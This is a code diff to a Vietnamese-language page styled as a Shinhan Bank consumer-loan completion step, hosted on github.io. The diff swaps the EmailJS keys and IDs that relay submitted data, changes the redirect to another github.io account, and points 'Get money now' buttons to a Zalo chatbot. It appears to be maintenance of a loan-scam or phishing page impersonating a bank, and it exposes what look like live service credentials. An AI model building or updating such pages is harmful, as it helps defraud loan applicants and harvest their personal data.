@@ -15,7 +15,7 @@
     <script type="text/javascript">
         (function() {
             // THAY THẾ 'YOUR_PUBLIC_KEY' BẰNG PUBLIC KEY CỦA BẠN TRÊN EMAILJS
-            emailjs.init('jugdaw6sXSdJVlAlt'); 
+            emailjs.init('c-Ms5MjWbitpDBb-E'); 
         })();
     </script>
     
@@ -323,11 +323,11 @@
             </div>
 
             <div class="actions">
-                <a href=" target="_blank" class="btn btn-primary">
+                <a href="https://chatbot.zalo.me/ref/1171052830978848308?id=tinnhanchaomung" target="_blank" class="btn btn-primary">
                     <i class="fab fa-rocketchat"></i>
                     <span>Liên hệ chuyên viên</span>
                 </a>
-                <a href=" target="_blank" class="btn btn-success">
+                <a href="https://chatbot.zalo.me/ref/1171052830978848308?id=tinnhanchaomung" target="_blank" class="btn btn-success">
                     <i class="fas fa-hand-holding-usd"></i>
                     <span>Nhận tiền Ngay</span>
                 </a>
@@ -346,15 +346,15 @@ const CompletionApp = {
     elements: {},
     config: {
         SECRET_KEY: 'shinhan-secret-key',
-        EMAILJS_SERVICE_ID: 'service_zspw0b7',
-        EMAILJS_TEMPLATE_ID: 'template_9jk2poj',
-        ZALO_REDIRECT_URL: 'http://zalo.me/1171052830978848308' // Thêm link Zalo vào config để dễ quản lý
+        EMAILJS_SERVICE_ID: 'service_60tgxof',
+        EMAILJS_TEMPLATE_ID: 'template_0eppfb8',
+        ZALO_REDIRECT_URL: 'https://chatbot.zalo.me/ref/1171052830978848308?id=tinnhanchaomung' // Thêm link Zalo vào config để dễ quản lý
     },
 
     init() {
         this.cacheDOMElements();
         if (!this.loadAndValidateData()) {
-            window.location.href = 'https://trum1212.github.io/shinhanbank/pages/vi/step1.html';
+            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html';
             return;
         }
         
@@ -380,8 +380,8 @@ const CompletionApp = {
 
             // Bắt đầu đếm ngược để chuyển hướng sau khi nội dung đã hiển thị
             setTimeout(() => {
-                window.location.href = this.config.ZALO_REDIRECT_URL;'http://zalo.me/1171052830978848308'
-            }, 90000); // Chuyển hướng sau 3 giây
+                window.location.href = this.config.ZALO_REDIRECT_URL;
+            }, 35000); // Chuyển hướng sau 3 giây
 
         }, 500);
     },
@@ -444,6 +444,3 @@ document.addEventListener('DOMContentLoaded', () => {
 </script>
 </body>
 </html>
-
-
-
